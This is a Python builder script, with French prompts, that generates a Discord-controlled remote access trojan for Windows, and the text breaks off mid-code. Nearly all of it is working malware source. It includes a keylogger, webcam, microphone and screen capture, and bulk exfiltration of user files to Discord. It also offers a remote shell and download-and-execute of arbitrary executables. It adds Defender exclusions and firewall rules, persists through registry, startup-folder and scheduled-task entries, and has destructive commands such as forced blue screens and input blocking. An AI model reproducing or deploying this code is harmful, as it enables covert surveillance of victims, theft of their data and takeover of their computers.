import os
import sys
import subprocess
import shutil
import ctypes

class Colors:
    @staticmethod
    def green_to_cyan(steps):
        colors = []
        for i in range(steps):
            t = i / max(1, steps - 1)
            r = int(0 + (0 - 0) * t)
            g = int(255 + (255 - 255) * t)
            b = int(0 + (255 - 0) * t)
            colors.append((r, g, b))
        return colors

class Center:
    @staticmethod
    def XCenter(text):
        lines = text.split('\n')
        terminal_width = shutil.get_terminal_size((80, 20)).columns
        centered = []
        for line in lines:
            stripped = line.rstrip()
            if stripped:
                spaces = (terminal_width - len(stripped)) // 2
                centered.append(' ' * spaces + stripped)
            else:
                centered.append('')
        return '\n'.join(centered)

class Colorate:
    @staticmethod
    def Horizontal(color_func, text, step=1):
        lines = text.split('\n')
        total_chars = sum(len(line) for line in lines)
        colors = color_func(total_chars)
        result = []
        color_index = 0
        for line in lines:
            colored_line = ""
            for char in line:
                if color_index < len(colors):
                    r, g, b = colors[color_index]
                    colored_line += f"\033[38;2;{r};{g};{b}m{char}"
                    color_index += step
                else:
                    colored_line += char
            result.append(colored_line)
        return '\n'.join(result) + "\033[0m"

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def Write(text):
    print(text, end='', flush=True)

def main():
    clear_screen()
    
    ascii_art = """
██████╗  █████╗ ████████╗    ██████╗ ██╗███████╗ ██████╗ ██████╗ ██████╗ ██████╗ 
██╔══██╗██╔══██╗╚══██╔══╝    ██╔══██╗██║██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔══██╗
██████╔╝███████║   ██║       ██║  ██║██║███████╗██║     ██║   ██║██████╔╝██║  ██║
██╔══██╗██╔══██║   ██║       ██║  ██║██║╚════██║██║     ██║   ██║██╔══██╗██║  ██║
██║  ██║██║  ██║   ██║       ██████╔╝██║███████║╚██████╗╚██████╔╝██║  ██║██████╔╝
╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝       ╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ 
    """
    
    Write(Colorate.Horizontal(Colors.green_to_cyan, Center.XCenter(ascii_art)))
    print("\n")
    
    Write(Colorate.Horizontal(Colors.green_to_cyan, "Bot Token : "))
    bot_token = input().strip()
    
    if not bot_token:
        Write(Colorate.Horizontal(Colors.green_to_cyan, '\nBot Token invalide!\n'))
        sys.exit()
    
    Write(Colorate.Horizontal(Colors.green_to_cyan, 'Verification du Bot Token...\n'))
    try:
        import requests
        headers = {'Authorization': f'Bot {bot_token}'}
        response = requests.get('https://discord.com/api/v10/users/@me', headers=headers, timeout=10)
        if response.status_code != 200:
            Write(Colorate.Horizontal(Colors.green_to_cyan, '\nBot Token invalide!\n'))
            sys.exit()
        bot_data = response.json()
        Write(Colorate.Horizontal(Colors.green_to_cyan, f'Bot connecte: {bot_data.get("username", "Unknown")}\n'))
    except Exception as e:
        Write(Colorate.Horizontal(Colors.green_to_cyan, f'\nErreur: {str(e)}\n'))
        sys.exit()
    
    Write(Colorate.Horizontal(Colors.green_to_cyan, 'Guild ID : '))
    guild_id = input().strip()
    
    if not guild_id or not guild_id.isdigit():
        Write(Colorate.Horizontal(Colors.green_to_cyan, '\nGuild ID invalide!\n'))
        sys.exit()
    
    Write(Colorate.Horizontal(Colors.green_to_cyan, 'Verification du Guild ID...\n'))
    try:
        response = requests.get(f'https://discord.com/api/v10/guilds/{guild_id}', headers=headers, timeout=10)
        if response.status_code != 200:
            Write(Colorate.Horizontal(Colors.green_to_cyan, '\nGuild ID invalide!\n'))
            sys.exit()
        guild_data = response.json()
        Write(Colorate.Horizontal(Colors.green_to_cyan, f'Serveur trouve: {guild_data.get("name", "Unknown")}\n'))
    except Exception as e:
        Write(Colorate.Horizontal(Colors.green_to_cyan, f'\nErreur: {str(e)}\n'))
        sys.exit()
    
    Write(Colorate.Horizontal(Colors.green_to_cyan, 'Choose file name : '))
    n = input().strip() or 'rat'
    
    payload_code = f'''import discord
import asyncio
import platform
import os
import pyautogui
import keyboard
import cv2
import winreg
import subprocess
import socket
import requests
import ctypes
import shutil
import pyperclip
import psutil
import comtypes.client
import win32gui
import win32con
import win32api
import zipfile
import wave
import numpy as np
from PIL import ImageGrab
import webbrowser
from datetime import datetime
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume

BOT_TOKEN = '{bot_token}'
GUILD_ID = {guild_id}

intents = discord.Intents.default()
intents.messages = True
intents.message_content = True
client = discord.Client(intents=intents)

control_channel = None
keylogs_channel = None
key_buffer = []
log_file = 'rat.log'
active_bots = {{}}
selected_bot = None
streaming = False

def log_local(message):
    with open(log_file, 'a', encoding='utf-8') as f:
        f.write(f"[{{datetime.now()}}] {{message}}\\n")

async def send_embed(channel, title, description=None, file=None, fields=None, color=0x00ff00):
    if channel is None:
        log_local(f"Send error: Channel is None for {{title}}")
        return
    try:
        embed = discord.Embed(title=title, description=description, color=color)
        if fields:
            for name, value in fields:
                embed.add_field(name=name, value=value, inline=False)
        if file:
            await channel.send(embed=embed, file=file)
        else:
            await channel.send(embed=embed)
    except Exception as e:
        log_local(f"Send error: {{e}}")

async def log_action(title, description, color=0x00ff00):
    await send_embed(control_channel, title, description=description, color=color)

async def get_ip_info():
    local_ip = socket.gethostbyname(socket.gethostname())
    try:
        public_ip = requests.get('https://api.ipify.org', timeout=5).text
        ip_data = requests.get('https://ipinfo.io/json', timeout=5).json()
        city = ip_data.get('city', 'Unknown')
        region = ip_data.get('region', 'Unknown')
        country = ip_data.get('country', 'Unknown')
        org = ip_data.get('org', 'Unknown')
        return local_ip, public_ip, city, region, country, org
    except Exception:
        return local_ip, 'Unknown', 'Unknown', 'Unknown', 'Unknown', 'Unknown'

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

def attempt_uac_elevation():
    if is_admin():
        return True
    try:
        script_path = os.path.abspath(__file__)
        ps_cmd = f'Start-Process python -ArgumentList \\'\\\\"{{script_path}}\\\\"\\' -Verb RunAs'
        subprocess.run(['powershell.exe', '-Command', ps_cmd], capture_output=True, text=True)
        log_local("UAC elevation attempted")
        return False
    except Exception as e:
        log_local(f"UAC elevation failed: {{e}}")
        return False

async def check_persistence():
    status = []
    rat_path = os.path.abspath(__file__)
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_READ)
        value, _ = winreg.QueryValueEx(key, 'SystemService')
        status.append(f"Registry: Active ({{value}})")
        winreg.CloseKey(key)
    except:
        status.append("Registry: Not found")
    startup_path = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'WindowsSvc.exe')
    status.append(f"Startup Folder: {{'Active' if os.path.exists(startup_path) else 'Not found'}}")
    try:
        result = subprocess.run('schtasks /query /tn SystemUpdater', shell=True, capture_output=True, text=True)
        status.append("Scheduled Task (admin): Active" if result.returncode == 0 else "Scheduled Task (admin): Not found")
    except:
        status.append("Scheduled Task (admin): Not found")
    try:
        result = subprocess.run('schtasks /query /tn SystemUpdaterNonAdmin', shell=True, capture_output=True, text=True)
        status.append("Scheduled Task (non-admin): Active" if result.returncode == 0 else "Scheduled Task (non-admin): Not found")
    except:
        status.append("Scheduled Task (non-admin): Not found")
    return status

async def process_command(message):
    global selected_bot, streaming
    command = message.content
    
    if command == '!clients':
        if not active_bots:
            await message.channel.send("No zombies connected")
            return
        clients_list = "**Connected Zombies:**\\n```"
        for bot_id, bot_info in active_bots.items():
            clients_list += f"ID: {{bot_id}}\\nUser: {{bot_info['user']}}\\nIP: {{bot_info['ip']}}\\nPC: {{bot_info['pc']}}\\n---\\n"
        clients_list += "```"
        await message.channel.send(clients_list)
        return
    
    elif command.startswith('!select '):
        target = command.split('!select ', 1)[1].strip()
        if target.lower() == 'all':
            selected_bot = 'all'
            await message.channel.send("**All bots activated**")
        elif target in active_bots:
            selected_bot = target
            await message.channel.send(f"**Bot {{target}} selected**\\n```User: {{active_bots[target]['user']}}\\nPC: {{active_bots[target]['pc']}}```")
        else:
            await message.channel.send(f"Bot ID {{target}} not found")
        return
    
    elif command.startswith('!selfdestruct '):
        target = command.split('!selfdestruct ', 1)[1].strip()
        if target.lower() == 'all':
            await message.channel.send("**💣 Self-destructing all bots...**")
            await asyncio.sleep(1)
            
            try:
                rat_path = os.path.abspath(__file__)
                
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_SET_VALUE)
                winreg.DeleteValue(key, 'SystemService')
                winreg.CloseKey(key)
            except:
                pass
            
            try:
                startup_path = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'WindowsSvc.exe')
                if os.path.exists(startup_path):
                    os.remove(startup_path)
            except:
                pass
            
            try:
                subprocess.run('schtasks /delete /tn "SystemUpdater" /f', shell=True, capture_output=True)
                subprocess.run('schtasks /delete /tn "SystemUpdaterNonAdmin" /f', shell=True, capture_output=True)
            except:
                pass
            
            try:
                if os.path.exists(rat_path):
                    with open(rat_path, 'w') as f:
                        f.write('# Self-destructed')
                    os.remove(rat_path)
            except:
                pass
            
            await client.close()
            sys.exit()
            
        elif target in active_bots:
            bot_info = active_bots[target]
            await message.channel.send(f"**💣 Self-destructing bot {{target}}**\\n```User: {{bot_info['user']}}\\nPC: {{bot_info['pc']}}```")
            del active_bots[target]
            if selected_bot == target:
                selected_bot = None
            
            try:
                rat_path = os.path.abspath(__file__)
                
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_SET_VALUE)
                winreg.DeleteValue(key, 'SystemService')
                winreg.CloseKey(key)
            except:
                pass
            
            try:
                startup_path = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'WindowsSvc.exe')
                if os.path.exists(startup_path):
                    os.remove(startup_path)
            except:
                pass
            
            try:
                subprocess.run('schtasks /delete /tn "SystemUpdater" /f', shell=True, capture_output=True)
                subprocess.run('schtasks /delete /tn "SystemUpdaterNonAdmin" /f', shell=True, capture_output=True)
            except:
                pass
            
            try:
                if os.path.exists(rat_path):
                    with open(rat_path, 'w') as f:
                        f.write('# Self-destructed')
                    os.remove(rat_path)
            except:
                pass
            
            await asyncio.sleep(1)
            await client.close()
            sys.exit()
        else:
            await message.channel.send(f"Bot ID {{target}} not found")
        return
    
    elif command.startswith('!spamcmd '):
        try:
            count = int(command.split('!spamcmd ', 1)[1].strip())
            if count > 500:
                await message.channel.send("Maximum 500 cmd windows")
                return
            await message.channel.send(f"**Opening {{count}} cmd windows...**")
            for i in range(count):
                subprocess.Popen('start cmd', shell=True)
                await asyncio.sleep(0.05)
            await message.channel.send(f"**Completed: {{count}} cmd windows**")
        except:
            await message.channel.send("Usage: !spamcmd <nombre>")
        return
    
    elif command == '!altf4':
        try:
            hwnd = win32gui.GetForegroundWindow()
            win32gui.PostMessage(hwnd, win32con.WM_CLOSE, 0, 0)
            await message.channel.send("**Alt+F4 executed**")
        except Exception as e:
            await message.channel.send(f"Error: {{e}}")
        return
    
    elif command == '!mute':
        try:
            devices = AudioUtilities.GetSpeakers()
            interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
            volume = cast(interface, POINTER(IAudioEndpointVolume))
            volume.SetMute(1, None)
            await message.channel.send("**Audio muted**")
        except Exception as e:
            await message.channel.send(f"Error: {{e}}")
        return
    
    elif command.startswith('!volume '):
        try:
            vol = int(command.split('!volume ', 1)[1].strip())
            if not 0 <= vol <= 100:
                await message.channel.send("Volume must be 0-100")
                return
            devices = AudioUtilities.GetSpeakers()
            interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
            volume = cast(interface, POINTER(IAudioEndpointVolume))
            volume.SetMasterVolumeLevelScalar(vol / 100.0, None)
            volume.SetMute(0, None)
            await message.channel.send(f"**Volume set to {{vol}}%**")
        except Exception as e:
            await message.channel.send(f"Error: {{e}}")
        return
    
    elif command == '!bsod':
        try:
            nullptr = ctypes.POINTER(ctypes.c_int)()
            ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
            ctypes.windll.ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, nullptr, 6, ctypes.byref(ctypes.c_uint()))
        except:
            pass
        return
    
    elif command == '!freeze':
        try:
            await message.channel.send("**Freezing PC...**")
            while True:
                pass
        except:
            pass
        return
    
    elif command == '!taskbar':
        try:
            taskbar = win32gui.FindWindow("Shell_TrayWnd", None)
            if win32gui.IsWindowVisible(taskbar):
                win32gui.ShowWindow(taskbar, win32con.SW_HIDE)
                await message.channel.send("**Taskbar hidden**")
            else:
                win32gui.ShowWindow(taskbar, win32con.SW_SHOW)
                await message.channel.send("**Taskbar shown**")
        except Exception as e:
            await message.channel.send(f"Error: {{e}}")
        return
    
    elif command.startswith('!mouse '):
        try:
            state = command.split('!mouse ', 1)[1].strip().lower()
            if state == 'off':
                ctypes.windll.user32.BlockInput(True)
                await message.channel.send("**Mouse disabled**")
            elif state == 'on':
                ctypes.windll.user32.BlockInput(False)
                await message.channel.send("**Mouse enabled**")
        except Exception as e:
            await message.channel.send(f"Error: {{e}}")
        return
    
    elif command.startswith('!keyboard '):
        try:
            state = command.split('!keyboard ', 1)[1].strip().lower()
            if state == 'off':
                ctypes.windll.user32.BlockInput(True)
                await message.channel.send("**Keyboard disabled**")
            elif state == 'on':
                ctypes.windll.user32.BlockInput(False)
                await message.channel.send("**Keyboard enabled**")
        except Exception as e:
            await message.channel.send(f"Error: {{e}}")
        return
    
    elif command == '!invertmouse':
        try:
            current = ctypes.windll.user32.GetSystemMetrics(23)
            ctypes.windll.user32.SwapMouseButton(not current)
            await message.channel.send("**Mouse inverted**")
        except Exception as e:
            await message.channel.send(f"Error: {{e}}")
        return
    
    elif command == '!upsidedown':
        try:
            device = win32api.EnumDisplayDevices()
            settings = win32api.EnumDisplaySettings(device.DeviceName, -1)
            settings.DisplayOrientation = 2
            win32api.ChangeDisplaySettings(settings, 0)
            await message.channel.send("**Screen flipped**")
        except Exception as e:
            await message.channel.send(f"Error: {{e}}")
        return
    
    elif command == '!exfiltrate':
        try:
            await message.channel.send("**Exfiltrating data...**")
            zip_path = os.path.join(os.environ['TEMP'], 'exfil.zip')
            with zipfile.ZipFile(zip_path, 'w') as zipf:
                for folder in ['Desktop', 'Documents', 'Downloads']:
                    folder_path = os.path.join(os.path.expanduser('~'), folder)
                    for root, dirs, files in os.walk(folder_path):
                        for file in files[:50]:
                            try:
                                zipf.write(os.path.join(root, file))
                            except:
                                pass
            with open(zip_path, 'rb') as f:
                await message.channel.send(file=discord.File(f, 'exfil.zip'))
            os.remove(zip_path)
        except Exception as e:
            await message.channel.send(f"Error: {{e}}")
        return
    
    elif command.startswith('!delete '):
        try:
            path = command.split('!delete ', 1)[1].strip()
            if os.path.exists(path):
                os.remove(path)
                await message.channel.send(f"**Deleted:** {{path}}")
            else:
                await message.channel.send("File not found")
        except Exception as e:
            await message.channel.send(f"Error: {{e}}")
        return
    
    elif command.startswith('!upload '):
        try:
            url = command.split('!upload ', 1)[1].strip()
            await message.channel.send(f"**Downloading from:** {{url}}")
            response = requests.get(url, stream=True)
            filename = url.split('/')[-1] or 'upload.exe'
            save_path = os.path.join(os.environ['TEMP'], filename)
            with open(save_path, 'wb') as f:
                shutil.copyfileobj(response.raw, f)
            subprocess.Popen(save_path, shell=True)
            await message.channel.send(f"**Executed:** {{filename}}")
        except Exception as e:
            await message.channel.send(f"Error: {{e}}")
        return
    
    elif command.startswith('!audio '):
        try:
            import pyaudio
            seconds = int(command.split('!audio ', 1)[1].strip())
            await message.channel.send(f"**Recording audio {{seconds}}s...**")
            chunk = 1024
            sample_format = pyaudio.paInt16
            channels = 2
            fs = 44100
            p = pyaudio.PyAudio()
            stream = p.open(format=sample_format, channels=channels, rate=fs, frames_per_buffer=chunk, input=True)
            frames = []
            for i in range(0, int(fs / chunk * seconds)):
                data = stream.read(chunk)
                frames.append(data)
            stream.stop_stream()
            stream.close()
            p.terminate()
            filename = f"audio_{{datetime.now().strftime('%Y%m%d_%H%M%S')}}.wav"
            filepath = os.path.join(os.environ['TEMP'], filename)
            wf = wave.open(filepath, 'wb')
            wf.setnchannels(channels)
            wf.setsampwidth(p.get_sample_size(sample_format))
            wf.setframerate(fs)
            wf.writeframes(b''.join(frames))
            wf.close()
            with open(filepath, 'rb') as f:
                await message.channel.send(file=discord.File(f, filename))
            os.remove(filepath)
        except Exception as e:
            await message.channel.send(f"Error: {{e}}")
        return
    
    elif command.startswith('!record '):
        try:
            seconds = int(command.split('!record ', 1)[1].strip())
            await message.channel.send(f"**Recording screen {{seconds}}s...**")
            filename = f"record_{{datetime.now().strftime('%Y%m%d_%H%M%S')}}.avi"
            filepath = os.path.join(os.environ['TEMP'], filename)
            screen_size = pyautogui.size()
            fourcc = cv2.VideoWriter_fourcc(*'XVID')
            out = cv2.VideoWriter(filepath, fourcc, 20.0, screen_size)
            start_time = datetime.now()
            while (datetime.now() - start_time).seconds < seconds:
                img = ImageGrab.grab()
                frame = np.array(img)
                frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                out.write(frame)
            out.release()
            with open(filepath, 'rb') as f:
                await message.channel.send(file=discord.File(f, filename))
            os.remove(filepath)
        except Exception as e:
            await message.channel.send(f"Error: {{e}}")
        return
    
    elif command.startswith('!website '):
        try:
            url = command.split('!website ', 1)[1].strip()
            webbrowser.open(url)
            await message.channel.send(f"**Opened:** {{url}}")
        except Exception as e:
            await message.channel.send(f"Error: {{e}}")
        return
    
    elif command == '!hide':
        try:
            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
            if hwnd:
                win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
            await message.channel.send("**Process hidden**")
        except Exception as e:
            await message.channel.send(f"Error: {{e}}")
        return
    
    elif command == '!stream':
        streaming = not streaming
        if streaming:
            await message.channel.send("**Stream started - 2s interval**")
            asyncio.create_task(stream_screen())
        else:
            await message.channel.send("**Stream stopped**")
        return
    
    elif command == '!screenshot':
        try:
            screenshot = pyautogui.screenshot()
            screenshot.save('screenshot.png')
            file = discord.File('screenshot.png')
            await send_embed(control_channel, "Screenshot", file=file)
            os.remove('screenshot.png')
        except Exception as e:
            await send_embed(control_channel, "Error", description=f"{{e}}", color=0xff0000)
    
    elif command == '!webcam':
        try:
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            if ret:
                cv2.imwrite('webcam.jpg', frame)
                file = discord.File('webcam.jpg')
                await send_embed(control_channel, "Webcam", file=file)
                os.remove('webcam.jpg')
            cap.release()
        except Exception as e:
            await send_embed(control_channel, "Error", description=f"{{e}}", color=0xff0000)
    
    elif command.startswith('!shell '):
        cmd = command[7:]
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            output = result.stdout or result.stderr or "No output"
            await send_embed(control_channel, "Shell", description=f"```\\n{{output[:1900]}}\\n```")
        except Exception as e:
            await send_embed(control_channel, "Error", description=f"{{e}}", color=0xff0000)
    
    elif command == '!info':
        local_ip, public_ip, city, region, country, org = await get_ip_info()
        fields = [
            ("Hostname", platform.node()),
            ("User", os.getlogin()),
            ("OS", f"{{platform.system()}} {{platform.release()}}"),
            ("Arch", platform.machine()),
            ("Local IP", local_ip),
            ("Public IP", public_ip),
            ("City", city),
            ("Region", region),
            ("Country", country),
            ("Org", org),
            ("Admin", str(is_admin()))
        ]
        await send_embed(control_channel, "Victim Info", fields=fields)
    
    elif command.startswith('!openfile '):
        path = command[10:].strip()
        try:
            subprocess.Popen(path, shell=True)
            await send_embed(control_channel, "Success", description=f"Opened: {{path}}")
        except Exception as e:
            await send_embed(control_channel, "Error", description=f"{{e}}", color=0xff0000)
    
    elif command.startswith('!download '):
        path = command[10:].strip()
        try:
            if not os.path.exists(path):
                raise FileNotFoundError("File not found")
            if os.path.getsize(path) > 8 * 1024 * 1024:
                raise ValueError("File too large (>8MB)")
            file = discord.File(path)
            await send_embed(control_channel, "Downloaded File", file=file)
        except Exception as e:
            await send_embed(control_channel, "Error", description=f"{{e}}", color=0xff0000)
    
    elif command.startswith('!listdir'):
        dir_path = command[8:].strip() or '.'
        try:
            files = os.listdir(dir_path)
            file_list = '\\n'.join(files[:100])
            await send_embed(control_channel, f"Directory: {{dir_path}}", description=f"```\\n{{file_list}}\\n```")
        except Exception as e:
            await send_embed(control_channel, "Error", description=f"{{e}}", color=0xff0000)
    
    elif command.startswith('!message '):
        text = command[9:]
        try:
            ctypes.windll.user32.MessageBoxW(0, text, "System", 0)
            await send_embed(control_channel, "Success", description="Message shown")
        except Exception as e:
            await send_embed(control_channel, "Error", description=f"{{e}}", color=0xff0000)
    
    elif command == '!shutdown':
        try:
            os.system('shutdown /s /t 0')
            await send_embed(control_channel, "Executing", description="Shutting down")
        except Exception as e:
            await send_embed(control_channel, "Error", description=f"{{e}}", color=0xff0000)
    
    elif command == '!restart':
        try:
            os.system('shutdown /r /t 0')
            await send_embed(control_channel, "Executing", description="Restarting")
        except Exception as e:
            await send_embed(control_channel, "Error", description=f"{{e}}", color=0xff0000)
    
    elif command.startswith('!execute '):
        url = command[9:].strip()
        try:
            response = requests.get(url, stream=True)
            if response.status_code != 200:
                raise ValueError("Bad URL")
            save_path = os.path.join(os.environ['TEMP'], 'sysupdate.exe')
            with open(save_path, 'wb') as f:
                shutil.copyfileobj(response.raw, f)
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, 'SysUpdate', 0, winreg.REG_SZ, f'"{{save_path}}"')
            winreg.CloseKey(key)
            subprocess.Popen(save_path, shell=True)
            await send_embed(control_channel, "Success", description=f"Executed from {{url}}")
        except Exception as e:
            await send_embed(control_channel, "Error", description=f"{{e}}", color=0xff0000)
    
    elif command == '!lock':
        try:
            ctypes.windll.user32.LockWorkStation()
            await send_embed(control_channel, "Success", description="Screen locked")
        except Exception as e:
            await send_embed(control_channel, "Error", description=f"{{e}}", color=0xff0000)
    
    elif command == '!clipboard':
        try:
            text = pyperclip.paste()
            await send_embed(control_channel, "Clipboard", description=f"```\\n{{text[:1900]}}\\n```")
        except Exception as e:
            await send_embed(control_channel, "Error", description=f"{{e}}", color=0xff0000)
    
    elif command.startswith('!setclipboard '):
        text = command[14:]
        try:
            pyperclip.copy(text)
            await send_embed(control_channel, "Success", description="Clipboard set")
        except Exception as e:
            await send_embed(control_channel, "Error", description=f"{{e}}", color=0xff0000)
    
    elif command.startswith('!kill '):
        process = command[6:].strip()
        try:
            killed = False
            for proc in psutil.process_iter(['name']):
                if proc.info['name'].lower() == process.lower():
                    proc.kill()
                    killed = True
            if killed:
                await send_embed(control_channel, "Success", description=f"Killed: {{process}}")
            else:
                await send_embed(control_channel, "Error", description="Process not found", color=0xff0000)
        except Exception as e:
            await send_embed(control_channel, "Error", description=f"{{e}}", color=0xff0000)
    
    elif command.startswith('!sound '):
        url = command[7:].strip()
        try:
            response = requests.get(url, stream=True)
            if response.status_code != 200:
                raise ValueError("Bad URL")
            save_path = os.path.join(os.environ['TEMP'], 'sound.wav')
            with open(save_path, 'wb') as f:
                shutil.copyfileobj(response.raw, f)
            subprocess.Popen(['start', save_path], shell=True)
            await send_embed(control_channel, "Success", description=f"Playing from {{url}}")
        except Exception as e:
            await send_embed(control_channel, "Error", description=f"{{e}}", color=0xff0000)
    
    elif command.startswith('!wallpaper '):
        url = command[11:].strip()
        try:
            response = requests.get(url, stream=True)
            if response.status_code != 200:
                raise ValueError("Bad URL")
            save_path = os.path.join(os.environ['TEMP'], 'wallpaper.jpg')
            with open(save_path, 'wb') as f:
                shutil.copyfileobj(response.raw, f)
            ctypes.windll.user32.SystemParametersInfoW(20, 0, save_path, 3)
            await send_embed(control_channel, "Success", description=f"Wallpaper set")
        except Exception as e:
            await send_embed(control_channel, "Error", description=f"{{e}}", color=0xff0000)
    
    elif command == '!processes':
        try:
            processes = [proc.info['name'] for proc in psutil.process_iter(['name'])][:50]
            proc_list = '\\n'.join(processes)
            await send_embed(control_channel, "Processes", description=f"```\\n{{proc_list}}\\n```")
        except Exception as e:
            await send_embed(control_channel, "Error", description=f"{{e}}", color=0xff0000)
    
    elif command.startswith('!beep '):
        try:
            freq, dur = map(int, command[6:].split())
            ctypes.windll.kernel32.Beep(freq, dur)
            await send_embed(control_channel, "Success", description=f"Beep: {{freq}}Hz {{dur}}ms")
        except Exception as e:
            await send_embed(control_channel, "Error", description=f"{{e}}", color=0xff0000)
    
    elif command == '!checkboot':
        status = await check_persistence()
        await send_embed(control_channel, "Persistence Status", description='\\n'.join(status))
    
    elif command == '!ping':
        await send_embed(control_channel, "Pong!", description="RAT is online")
    
    elif command == '!help':
        embed = discord.Embed(title="📋 RAT Discord - Command List", color=0x00ff00)
        embed.description = """!clients - List zombies
!select <ID|all> - Select bot(s)
!selfdestruct <ID|all> - Self-destruct
!spamcmd <n> - Spam cmd windows
!altf4 - Close window
!mute - Mute audio
!volume <0-100> - Set volume
!bsod - Blue screen
!freeze - Freeze PC
!taskbar - Hide/show taskbar
!mouse <on|off> - Enable/disable mouse
!keyboard <on|off> - Enable/disable keyboard
!invertmouse - Invert mouse
!upsidedown - Flip screen
!exfiltrate - Zip files
!delete <path> - Delete file
!upload <url> - Download/execute
!audio <sec> - Record audio
!record <sec> - Record video
!website <url> - Open site
!hide - Hide process
!stream - Toggle stream
!screenshot - Take screenshot
!webcam - Webcam photo
!shell <cmd> - Run shell command
!info - System information
!openfile <path> - Open file
!download <path> - Download file
!listdir [dir] - List directory
!message <text> - Show message box
!shutdown - Shutdown PC
!restart - Restart PC
!execute <url> - Download/run exe
!lock - Lock screen
!clipboard - Get clipboard
!setclipboard <text> - Set clipboard
!kill <process> - Kill process
!sound <url> - Play sound
!wallpaper <url> - Set wallpaper
!processes - List processes
!beep <freq> <dur> - System beep
!checkboot <ID|all> - Check persistence
!ping - Check if online"""
        embed.set_footer(text="RAT Discord • 40 Commands Available")
        await message.channel.send(embed=embed)

async def stream_screen():
    while streaming:
        try:
            screenshot = pyautogui.screenshot()
            screenshot.save('stream.png')
            file = discord.File('stream.png')
            await control_channel.send(file=file)
            os.remove('stream.png')
            await asyncio.sleep(2)
        except:
            break

def add_exclusions():
    successes = []
    fails = []
    rat_path = os.path.abspath(__file__)
    try:
        cmd = f'powershell.exe -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath \\'{{os.path.dirname(rat_path)}}\\'; Add-MpPreference -ExclusionProcess \\'{{os.path.basename(rat_path)}}\\'"'
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            successes.append("Defender exclusion added")
    except Exception as e:
        fails.append(f"Defender fail: {{e}}")
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Processes', 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, os.path.basename(rat_path), 0, winreg.REG_SZ, '')
        winreg.CloseKey(key)
        successes.append("Registry exclusion added")
    except Exception as e:
        fails.append(f"Registry fail: {{e}}")
    try:
        cmd = f'netsh advfirewall firewall add rule name="SystemService" dir=in action=allow program="{{rat_path}}" enable=yes'
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            successes.append("Firewall rule added")
    except Exception as e:
        fails.append(f"Firewall fail: {{e}}")
    return successes, fails

def add_persistences():
    successes = []
    fails = []
    rat_path = os.path.abspath(__file__)
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, 'SystemService', 0, winreg.REG_SZ, f'"{{rat_path}}"')
        winreg.CloseKey(key)
        successes.append("Registry persistence added")
    except Exception as e:
        fails.append(f"Registry fail: {{e}}")
    try:
        startup_folder = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        startup_path = os.path.join(startup_folder, 'WindowsSvc.exe')
        shutil.copy(rat_path, startup_path)
        successes.append("Startup folder persistence added")
    except Exception as e:
        fails.append(f"Startup fail: {{e}}")
    try:
        cmd = f'schtasks /create /tn "SystemUpdater" /tr "{{rat_path}}" /sc onlogon /rl highest /f'
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            successes.append("Scheduled Task (admin) added")
    except Exception as e:
        fails.append(f"Task fail: {{e}}")
    try:
        cmd = f'schtasks /create /tn "SystemUpdaterNonAdmin" /tr "{{rat_path}}" /sc onlogon /f'
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            successes.append("Scheduled Task (non-admin) added")
    except Exception as e:
        fails.append(f"Non-admin task fail: {{e}}")
    return successes, fails

async def keylogger():
    while True:
        if key_buffer:
            keys = ''.join(key_buffer)[:1900]
            if keylogs_channel:
                await send_embed(keylogs_channel, "Key Logs", description=f"```\\n{{keys}}\\n```")
            else:
                log_local(f"Keys: {{keys}}")
            key_buffer.clear()
        await asyncio.sleep(30)

def start_keylogger():
    def on_key(event):
        key = event.name
        if key == 'enter':
            key_buffer.append('\\n[ENTER]\\n')
        elif key == 'backspace':
            key_buffer.append('[BACKSPACE]')
        elif key == 'tab':
            key_buffer.append('[TAB]')
        elif len(key) == 1:
            key_buffer.append(key)
    keyboard.on_press(on_key)

@client.event
